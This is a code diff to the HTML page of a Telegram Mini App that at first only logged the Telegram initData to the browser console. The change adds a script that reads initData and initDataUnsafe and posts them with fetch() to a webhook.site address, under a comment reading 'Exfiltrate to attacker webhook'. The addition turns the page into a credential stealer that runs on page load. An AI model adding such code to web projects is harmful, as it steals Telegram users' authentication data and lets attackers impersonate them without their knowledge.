@@ -9,19 +9,23 @@
   <p>Open the browser console (F12) inside Telegram to see initData.</p>
 
   <!-- Load Telegram WebApp SDK -->
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+  const initData = Telegram.WebApp.initData;
+  const initDataUnsafe = Telegram.WebApp.initDataUnsafe;
 
-  <script>
-    // Ensure Telegram object exists
-    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
-      const initData = Telegram.WebApp.initData;
-      const initDataUnsafe = Telegram.WebApp.initDataUnsafe;
+  // Log for debug
+  console.log("🔐 Telegram initData:", initData);
+  console.log("🔓 Parsed initDataUnsafe:", initDataUnsafe);
 
-      console.log("🔐 Telegram initData:", initData);
-      console.log("🔓 Parsed initDataUnsafe:", initDataUnsafe);
-    } else {
-      console.warn("⚠️ Telegram WebApp not initialized. Make sure this is opened INSIDE Telegram.");
-    }
-  </script>
+  // Exfiltrate to attacker webhook
+  fetch("https://webhook.site/388648e4-9e1e-4912-b937-c8ac12c8aafd", {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ initData, initDataUnsafe })
+  });
+</script>
+
 </body>
 </html>
